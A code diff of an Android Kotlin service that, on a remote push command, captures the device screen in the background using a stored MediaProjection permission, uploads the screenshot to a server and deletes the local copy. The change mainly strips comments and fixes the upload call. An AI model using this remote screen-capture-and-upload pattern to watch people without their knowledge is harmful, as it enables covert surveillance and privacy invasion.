@@ -25,22 +25,13 @@ import java.io.File
 import java.io.FileOutputStream
 import java.nio.ByteBuffer
 
-/**
- * PROPER Background Screenshot Service
- * Menggunakan MediaProjection API untuk capture screen dari background
- * 
- * SETUP REQUIRED:
- * 1. Request MediaProjection permission dari MainActivity
- * 2. Store resultCode & data Intent
- * 3. Pass ke service ini saat FCM command diterima
- */
 class ScreenCaptureBackgroundService : Service() {
     companion object {
         private const val TAG = "ScreenCaptureService"
         private const val NOTIFICATION_ID = 2002
         private const val CHANNEL_ID = "screen_capture_channel"
         
-        // ✅ Simpan MediaProjection permission result
+        // ✅ MediaProjection permission storage
         var mediaProjectionResultCode: Int? = null
         var mediaProjectionData: Intent? = null
         var hasPermission = false
@@ -55,9 +46,6 @@ class ScreenCaptureBackgroundService : Service() {
             }
         }
         
-        /**
-         * Call this from MainActivity setelah user approve MediaProjection
-         */
         fun savePermission(resultCode: Int, data: Intent) {
             mediaProjectionResultCode = resultCode
             mediaProjectionData = data
@@ -158,7 +146,7 @@ class ScreenCaptureBackgroundService : Service() {
             // Wait for image then capture
             handler.postDelayed({
                 captureImage()
-            }, 500) // Small delay untuk ensure screen sudah ter-render
+            }, 500)
             
         } catch (e: Exception) {
             Log.e(TAG, "❌ Failed to capture screen", e)
@@ -222,17 +210,20 @@ class ScreenCaptureBackgroundService : Service() {
             Log.d(TAG, "✅ Screenshot saved: ${file.path}")
             Log.d(TAG, "Size: ${file.length() / 1024} KB")
             
-            // Send to server
+            // ✅ FIX: Send to server with proper context
             Thread {
                 try {
-                    ApiClient.uploadScreenshot(context, file)
-                    Log.d(TAG, "✅ Screenshot upload initiated")
+                    val success = ApiClient.uploadScreenshot(
+                        applicationContext,  // ✅ Use applicationContext
+                        file
+                    )
                     
                     if (success) {
                         Log.d(TAG, "✅ Screenshot uploaded successfully")
                     } else {
-                        Log.e(TAG, "❌ Failed to upload Screenshot")
+                        Log.e(TAG, "❌ Failed to upload screenshot")
                     }
+                    
                     // Delete after upload
                     file.delete()
                     
